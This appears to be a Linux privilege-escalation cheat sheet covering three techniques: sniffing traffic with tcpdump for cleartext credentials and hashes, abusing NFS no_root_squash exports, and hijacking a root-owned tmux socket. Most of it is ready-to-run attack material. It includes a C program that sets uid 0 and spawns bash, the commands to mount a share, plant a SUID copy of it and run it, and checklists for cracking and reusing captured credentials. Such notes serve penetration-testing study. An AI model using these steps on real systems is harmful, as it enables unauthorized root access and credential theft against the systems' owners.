# Passive Traffic Capture

## Enumeration
- Check if `tcpdump` is installed:
  ```bash
  which tcpdump
  tcpdump --version
  ```
- Verify if current user can capture traffic:
  ```bash
  id
  getcap $(which tcpdump) 2>/dev/null
  ```

## What to Look For
- Cleartext credentials in:
  - HTTP
  - FTP
  - POP3
  - IMAP
  - SMTP
  - Telnet
- Sensitive information:
  - Credit card numbers
  - SNMP community strings
- Authentication hashes:
  - Net-NTLMv2
  - SMBv2
  - Kerberos

## Useful Tools
- `tcpdump` - Capture network traffic.
- `net-creds` - Extract credentials from captures.
- `PCredz` - Parse captures for credentials and hashes.

## Privesc Checklist
- [ ] `tcpdump` available?
- [ ] Capture traffic.
- [ ] Search for cleartext credentials.
- [ ] Extract hashes for offline cracking.
- [ ] Reuse recovered credentials for privilege escalation.

# Weak NFS Privileges (no_root_squash)

## Enumerate NFS Shares
```bash
showmount -e <TARGET_IP>
```

## Check Exports (If Local Access)
```bash
cat /etc/exports
```

## Dangerous Configuration
```text
no_root_squash
```

- Remote root remains **root** on the NFS server.
- Allows uploading **root-owned SUID binaries**.

## Exploitation Steps

### 1. Create SUID Shell
```c
#include <unistd.h>
#include <stdlib.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

### 2. Compile
```bash
gcc shell.c -o shell
```

### 3. Mount NFS Share
```bash
sudo mount -t nfs <TARGET_IP>:/tmp /mnt
```

### 4. Copy & Set SUID
```bash
cp shell /mnt
chmod u+s /mnt/shell
```

### 5. Execute on Target
```bash
/tmp/shell
id
```

## Enumeration Checklist
- [ ] Enumerate exports (`showmount -e`).
- [ ] Look for `no_root_squash`.
- [ ] Mount writable share.
- [ ] Upload SUID binary.
- [ ] Execute binary for root shell.

# Hijacking tmux Sessions

## Why It Works
- Root leaves a `tmux` session running.
- Socket is accessible to another group/user.
- Attaching to the session gives a root shell.

## Enumerate Running Sessions
```bash
ps aux | grep tmux
```

## Check Socket Permissions
```bash
ls -la /shareds
```

Example:
```text
srw-rw---- root devs
```

## Check Group Membership
```bash
id
```

- Verify membership in the socket's group (e.g., `devs`).

## Attach to Session
```bash
tmux -S /shareds
```

## Verify Access
```bash
id
```

## Privesc Checklist
- [ ] Enumerate running `tmux` processes.
- [ ] Locate tmux socket.
- [ ] Check socket permissions.
- [ ] Confirm group membership.
- [ ] Attach to session.
- [ ] Verify root privileges.
